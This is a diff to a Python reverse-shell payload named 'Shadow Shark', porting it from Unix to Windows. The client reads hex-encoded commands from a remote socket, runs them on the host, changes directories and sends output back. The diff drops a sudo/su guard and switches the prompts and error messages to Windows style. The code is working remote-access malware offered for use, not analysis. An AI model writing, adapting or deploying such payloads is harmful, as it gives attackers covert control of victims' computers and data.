@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
 """
-A full fledged Shadow Shark payload for Unix.
+A full fledged Shadow Shark payload for Windows.
 
 @author: Mr. Shark Spam Bot
 """
@@ -9,12 +9,6 @@ import subprocess
 import os
 import codecs
 import json
-import platform
-import getpass
-
-BLUE = '\033[94m'
-GREEN = '\033[92m'
-NORMAL = '\033[0m'
 
 def hex_handler(text, encode=False, decode=False):
     '''Encode or decode text using hex.'''
@@ -50,25 +44,12 @@ while True:
     except json.decoder.JSONDecodeError:
         continue
 
-    if 'sudo' in command or 'su' in command:
-        rev_socket.send(hex_handler('sudo and su are not supported.', encode=True))
-        continue
-
     if command == 'exit':
         rev_socket.close()
         break
 
     if command == 'directory':
-        user = getpass.getuser()
-        system = platform.uname().node
-        cwd = os.getcwd()
-        if cwd.startswith(os.path.expanduser('~')):
-            user_path = cwd.split(os.path.expanduser('~'))
-            user_path = ''.join(user_path)
-            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}~{user_path}{NORMAL}$'
-        else:
-            prompt = f'{GREEN}{user}@{system}{NORMAL}:{BLUE}{cwd}{NORMAL}$'
-        rev_socket.send(hex_handler(prompt, encode=True))
+        rev_socket.send(hex_handler(os.getcwd() + '>', encode=True))
         continue
 
     if command.startswith('background_exec') and len(command.split()) >= 2:
@@ -91,12 +72,9 @@ while True:
 
     if command.startswith('cd') and len(command.split()) >= 2:
         try:
-            if command[3] == '~':
-                os.chdir(f'{os.path.expanduser("~")}{command[4:]}')
-            else:
-                os.chdir(command[3:])
+            os.chdir(command[3:])
         except IOError:
-            rev_socket.send(hex_handler(f'bash: cd: {command[3:]}: No such file or directory', encode=True))
+            rev_socket.send(hex_handler('The system cannot find path specified.', encode=True))
             continue
 
     rev_socket.send(hex_handler('\n', encode=True))
